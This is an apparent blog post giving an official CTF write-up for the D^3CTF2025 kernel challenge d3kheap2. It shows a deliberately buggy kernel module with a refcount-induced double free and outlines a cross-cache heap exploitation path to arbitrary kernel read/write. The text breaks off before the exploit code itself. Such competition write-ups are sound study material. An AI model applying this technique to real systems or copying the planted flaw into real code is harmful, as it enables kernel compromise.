<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="arttnba3">


    <meta name="subtitle" content="arttnba3的秘密小屋">


    <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ">



<title>[CTF.0x0A] D^3CTF2025 Official Writeup - d3kheap2 &amp; d3kshrm | arttnba3&#39;s blog</title>



    <link rel="icon" href="/img/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">「arttnba3」&#39;s reservation</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">「arttnba3」&#39;s reservation</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">[CTF.0x0A] D^3CTF2025 Official Writeup - d3kheap2 &amp; d3kshrm</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">arttnba3</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">六月 4, 2025&nbsp;&nbsp;19:40:08</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="0x00-Before-We-Start"><a href="#0x00-Before-We-Start" class="headerlink" title="0x00. Before We Start"></a>0x00. Before We Start</h1><p>To be honest I hadn’t planned to create any challenges for this year’s D^3CTF 2025, as I hadn’t prepared ideas that are fucking cool and fancy enough as my expectation. And generally it should be the task of my junior schoolmates who hadn’t graduated from my bachelor’s university to prepare the main part of the challenges in this competition. However, due to some reality issues they hadn’t have the Pwn part done and I got to know that just 10 days before the competition start. Therefore I have to rush to stand out together with my legacy teammate <a target="_blank" rel="noopener" href="https://github.com/yikesoftware">Eqqie</a> (a kind of penguin (aka QI’E in Chinese) living on the EQuatorial, who is powerful in hunting CVEs) to create Pwn challenges with poor ideas. Fortunately we finally made three Pwn challenges in the end and we still succeeded to make the Pwn part of the D^3CTF 2025 looks normal.</p>
<p>Though ideas we presented today might not be cool and fancy enough, I still hope that you can like them. Here comes the detailed writeup :)</p>
<h1 id="0x01-D3KHEAP2-6-Solves"><a href="#0x01-D3KHEAP2-6-Solves" class="headerlink" title="0x01. D3KHEAP2 | 6 Solves"></a>0x01. D3KHEAP2 | 6 Solves</h1><p>“Once I was seven years old my arttnba3 told me”</p>
<p>“go make yourself some d3kheap or you’ll be lonely”</p>
<p>“Soon I’ll be 60 years old will I think the kernel pwn is cold”</p>
<p>“Or will I have a lot of baby heap who can sign me in”</p>
<blockquote>
<p>Copyright(c) 2025 &lt;ディーキューブ・シーティーエフ カーネル Pwn 製作委員会&gt;</p>
<p>Author: arttnba3 @ L-team x El3ctronic x D^3CTF</p>
<p>You can get the attachment at <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2025_d3kheap2">https://github.com/arttnba3/D3CTF2025_d3kheap2</a>.</p>
</blockquote>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>A very easy kernel pwn challenge that does not need to spend too many efforts on the reverse engineering. The challenge provides us with a kernel module named d3kheap2.ko , which has only the function of allocating and freeing objects from an isolated kmem_cache d3kheap2_cache. The vulnerability is that we can free an object twice due to the misconfiguration of the initialization of the reference count, which is similar to the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2022_d3kheap">d3kheap</a>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">d3kheap2_ioctl</span><span class="params">(<span class="keyword">struct</span> file*filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">d3kheap2_ureq</span> <span class="title">ureq</span>;</span></span><br><span class="line">    <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;d3kheap2_globl_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ureq, (<span class="type">void</span>*) arg, <span class="keyword">sizeof</span>(ureq))) &#123;</span><br><span class="line">        logger_error(<span class="string">&quot;Unable to copy request from userland!\n&quot;</span>);</span><br><span class="line">        res = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ureq.idx &gt;= D3KHEAP2_BUF_NR) &#123;</span><br><span class="line">        logger_error(<span class="string">&quot;Got invalid request from userland!\n&quot;</span>);</span><br><span class="line">        res = -EINVAL;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> D3KHEAP2_OBJ_ALLOC:</span><br><span class="line">        <span class="keyword">if</span> (d3kheap2_bufs[ureq.idx].buffer) &#123;</span><br><span class="line">            logger_error(</span><br><span class="line">                <span class="string">&quot;Expected slot [%d] has already been occupied!\n&quot;</span>,</span><br><span class="line">                ureq.idx</span><br><span class="line">            );</span><br><span class="line">            res = -EPERM;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        d3kheap2_bufs[ureq.idx].buffer = kmem_cache_alloc(</span><br><span class="line">            d3kheap2_cachep,</span><br><span class="line">            GFP_KERNEL | __GFP_ZERO</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!d3kheap2_bufs[ureq.idx].buffer) &#123;</span><br><span class="line">            logger_error(<span class="string">&quot;Failed to alloc new buffer on expected slot!\n&quot;</span>);</span><br><span class="line">            res = -ENOMEM;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* vulnerability here */</span></span><br><span class="line">        <span class="type">atomic_set</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count, <span class="number">1</span>);</span><br><span class="line">        <span class="type">atomic_inc</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count);</span><br><span class="line"></span><br><span class="line">        logger_info(</span><br><span class="line">            <span class="string">&quot;Successfully allocate new buffer for slot [%d].\n&quot;</span>,</span><br><span class="line">            ureq.idx</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> D3KHEAP2_OBJ_FREE:</span><br><span class="line">        <span class="keyword">if</span> (!d3kheap2_bufs[ureq.idx].buffer) &#123;</span><br><span class="line">            logger_error(</span><br><span class="line">                <span class="string">&quot;Expected slot [%d] had not been allocated!\n&quot;</span>,</span><br><span class="line">                ureq.idx</span><br><span class="line">            );</span><br><span class="line">            res = -EPERM;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            logger_error(<span class="string">&quot;You&#x27;re not allowed to free a free slot!&quot;</span>);</span><br><span class="line">            res = -EPERM;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">atomic_dec</span>(&amp;d3kheap2_bufs[ureq.idx].ref_count);</span><br><span class="line">        kmem_cache_free(d3kheap2_cachep, d3kheap2_bufs[ureq.idx].buffer);</span><br><span class="line"></span><br><span class="line">        logger_info(</span><br><span class="line">            <span class="string">&quot;Successfully free existed buffer on slot [%d].\n&quot;</span>,</span><br><span class="line">            ureq.idx</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> D3KHEAP2_OBJ_EDIT:</span><br><span class="line">        logger_error(</span><br><span class="line">            <span class="string">&quot;🕊🕊🕊 This function hadn&#x27;t been completed yet bcuz I&#x27;m a pigeon!\n&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> D3KHEAP2_OBJ_SHOW:</span><br><span class="line">        logger_error(</span><br><span class="line">            <span class="string">&quot;🕊🕊🕊 This function hadn&#x27;t been completed yet bcuz I&#x27;m a pigeon!\n&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        logger_error(<span class="string">&quot;Got invalid request from userland!\n&quot;</span>);</span><br><span class="line">        res = -EINVAL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    spin_unlock(&amp;d3kheap2_globl_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>As the victim object is in a dedicated <code>kmem_cache</code> , we have to think outside of the box. Hence here comes the cross-cache attack:</p>
<ul>
<li>Heap spray to allocate lots of challenge objects and then free them all to free the SLUB pages back to the BUDDY</li>
<li>Heap spray to allocate the freed pages into another <code>kmem_cache</code> , here we choose the <code>system V IPC</code> as the victim at the first stage</li>
<li>Free the dangling pointer to challenge object to create UAF on <code>msg_msgseg</code> and allocate again to get two reference on the same object</li>
<li>Free one of the reference and reallocate that as <code>pipe_buffer</code>, whose GFP flag is the same with <code>msg_msgseg</code> , both of them are allocated from <code>kmalloc-cg</code> (if the <code>CONFIG_SLAB_BUCKETS</code> is <strong>DISABLED</strong>)</li>
<li>Manipulate <code>msg_msgseg</code> and <code>pipe_buffer</code> to gain the arbitrary read &amp; write capability in the kernel space</li>
</ul>
<p>Hence we have our final exploitation in the file <code>exp.c</code> in this repository. The  final successful rate for this is at approximately <code>99.32%</code> (result after more than 1024 times automatic local test), which I think is stable enough : )</p>
<blockquote>
<p>Note that you can improve the speed on uploading the exploit to the remote environment by minimizing the binary with <code>musl-gcc</code> (I use <code>x86_64-gentoo-linux-musl-gcc</code> in my test) or purely assembly code if you have enough time :)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span 